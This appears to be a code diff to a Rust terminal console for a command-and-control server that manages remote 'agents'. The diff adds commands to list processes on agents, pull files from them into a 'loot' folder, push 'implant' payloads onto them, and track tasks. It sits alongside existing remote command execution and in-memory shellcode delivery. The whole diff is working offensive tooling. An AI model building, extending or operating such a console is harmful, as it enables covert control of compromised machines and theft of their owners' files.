@@ -111,6 +111,12 @@ impl App {
                  use <id>          select agent by id\n  \
                  exec <cmd...>     run command on agent\n  \
                  shellcode <file>  send encrypted shellcode to agent (in-memory exec)\n  \
+                 ps                list processes on the agent\n  \
+                 download <path>   pull a file from the agent into ./loot\n  \
+                 implant <src> <dst>  push a local file to the agent\n  \
+                 tasks             show task history and status\n  \
+                 loot              show files collected so far\n  \
+                 staged            show files waiting for pickup\n  \
                  <cmd...>          alias for exec\n  \
                  sleep <s>         set agent sleep seconds\n  \
                  jitter <s>        set agent jitter seconds\n  \
@@ -122,6 +128,11 @@ impl App {
             "sleep" => self.handle_config("sleep", rest),
             "jitter" => self.handle_config("jitter", rest),
             "shellcode" => self.handle_shellcode(rest),
+            "tasks" => self.show_tasks(),
+            "loot" => self.show_loot(),
+            "download" => self.handle_download(rest),
+            "implant" => self.handle_implant(rest),
+            "staged" => self.show_staged(),
             _ => self.send_to_agent(head, rest),
         }
     }
@@ -224,6 +235,160 @@ impl App {
             None => {
                 drop(s);
                 self.local_log("failed to enqueue shellcode task");
+            }
+        }
+    }
+
+    fn show_tasks(&mut self) {
+        let Some(id) = self.selected_agent() else {
+            self.local_log("no agent selected");
+            return;
+        };
+        let s = self.state.lock().unwrap();
+        let Some(entry) = s.get(&id) else {
+            drop(s);
+            self.local_log("agent not found");
+            return;
+        };
+        if entry.tasks.is_empty() {
+            drop(s);
+            self.local_log("no tasks yet");
+            return;
+        }
+        let mut lines = Vec::new();
+        for task in &entry.tasks {
+            let elapsed = task
+                .duration_ms
+                .map(|ms| format!(" {ms}ms"))
+                .unwrap_or_default();
+            lines.push(format!(
+                "[{}] {}{elapsed}",
+                clock(task.created),
+                task.summary()
+            ));
+            if let Some(err) = &task.error {
+                lines.push(format!("    error: {err}"));
+            } else if !task.output.is_empty() {
+                let first: String = task.output.lines().take(3).collect::<Vec<_>>().join(" | ");
+                lines.push(format!("    {}", first.chars().take(160).collect::<String>()));
+            }
+        }
+        drop(s);
+        self.local_log(lines.join("\n"));
+    }
+
+    fn show_loot(&mut self) {
+        let s = self.state.lock().unwrap();
+        let loot = s.loot();
+        if loot.is_empty() {
+            drop(s);
+            self.local_log("loot is empty");
+            return;
+        }
+        let lines: Vec<String> = loot
+            .iter()
+            .map(|l| {
+                format!(
+                    "[{}] {}  {} bytes  sha256={}..  from {}",
+                    clock(l.received),
+                    l.path.display(),
+                    l.size,
+                    &l.sha256[..12],
+                    l.agent_id
+                )
+            })
+            .collect();
+        drop(s);
+        self.local_log(lines.join("\n"));
+    }
+
+    fn show_staged(&mut self) {
+        let s = self.state.lock().unwrap();
+        let staged = s.staged();
+        if staged.is_empty() {
+            drop(s);
+            self.local_log("nothing staged");
+            return;
+        }
+        let lines: Vec<String> = staged
+            .iter()
+            .map(|(id, name, size)| format!("{id}  {name}  {size} bytes"))
+            .collect();
+        drop(s);
+        self.local_log(lines.join("\n"));
+    }
+
+    /// Pulls a file from the agent; the agent streams it back in chunks.
+    fn handle_download(&mut self, rest: &str) {
+        let Some(id) = self.selected_agent() else {
+            self.local_log("no agent selected");
+            return;
+        };
+        let path = rest.trim();
+        if path.is_empty() {
+            self.local_log("usage: download <path>");
+            return;
+        }
+        let mut s = self.state.lock().unwrap();
+        match s.enqueue_task(&id, "download".to_string(), vec![path.to_string()]) {
+            Some(task_id) => {
+                drop(s);
+                self.local_log(format!("[c2] download queued as {task_id}"));
+            }
+            None => {
+                drop(s);
+                self.local_log("failed to queue download");
+            }
+        }
+    }
+
+    /// Stages a local file and tells the agent to pull and write it.
+    fn handle_implant(&mut self, rest: &str) {
+        let Some(id) = self.selected_agent() else {
+            self.local_log("no agent selected");
+            return;
+        };
+        let args = match split_args(rest) {
+            Ok(a) => a,
+            Err(e) => {
+                self.local_log(format!("bad arguments: {e}"));
+                return;
+            }
+        };
+        if args.len() != 2 {
+            self.local_log("usage: implant <local-file> <remote-path>");
+            return;
+        }
+        let data = match std::fs::read(&args[0]) {
+            Ok(d) => d,
+            Err(e) => {
+                self.local_log(format!("cannot read {}: {e}", args[0]));
+                return;
+            }
+        };
+        let name = std::path::Path::new(&args[0])
+            .file_name()
+            .map(|n| n.to_string_lossy().to_string())
+            .unwrap_or_else(|| "payload".to_string());
+
+        let mut s = self.state.lock().unwrap();
+        let transfer = s.stage_download(&name, data.clone());
+        let task = s.enqueue_task(
+            &id,
+            "implant".to_string(),
+            vec![transfer.clone(), args[1].clone()],
+        );
+        match task {
+            Some(task_id) => {
+                drop(s);
+                self.local_log(format!(
+                    "[c2] staged {} bytes as {transfer}; implant queued as {task_id}",
+                    data.len()
+                ));
+            }
+            None => {
+                drop(s);
+                self.local_log("failed to queue implant");
             }
         }
     }
@@ -373,8 +538,43 @@ fn ui(f: &mut Frame, app: &mut App) {
     render_agents(f, app, body[0]);
     render_console(f, app, body[1]);
 
+    let footer = match app.selected_agent() {
+        Some(id) => {
+            let s = app.state.lock().unwrap();
+            match s.get(&id) {
+                Some(e) => {
+                    let done = e
+                        .tasks
+                        .iter()
+                        .filter(|t| t.status == chamuko_protocol::TaskStatus::Completed)
+                        .count();
+                    let failed = e
+                        .tasks
+                        .iter()
+                        .filter(|t| t.status == chamuko_protocol::TaskStatus::Failed)
+                        .count();
+                    let last = e
+                        .last_finished()
+                        .map(|t| format!(" | last: {}", t.summary()))
+                        .unwrap_or_default();
+                    format!(
+                        "{id} | {} task(s): {} done, {} failed, {} queued | loot {} | {}{last}",
+                        e.tasks.len(),
+                        done,
+                        failed,
+                        e.pending_count(),
+                        s.loot().len(),
+                        e.info.os
+                    )
+                }
+                None => "agent not found".to_string(),
+            }
+        }
+        None => String::from("no agent selected"),
+    };
+
     let input_title = if app.status.is_empty() {
-        " command ".to_string()
+        format!(" {footer} ")
     } else {
         format!(" {} ", app.status.lines().next().unwrap_or(""))
     };
@@ -430,6 +630,14 @@ fn render_agents(f: &mut Frame, app: &mut App, area: Rect) {
                     Style::default().fg(GREY),
                 ),
                 Span::styled(format!("  {age}s"), Style::default().fg(DARK_RED)),
+                if e.pending_count() > 0 {
+                    Span::styled(
+                        format!("  {}q", e.pending_count()),
+                        Style::default().fg(BRIGHT),
+                    )
+                } else {
+                    Span::raw("")
+                },
             ]);
             Some(ListItem::new(line))
         })
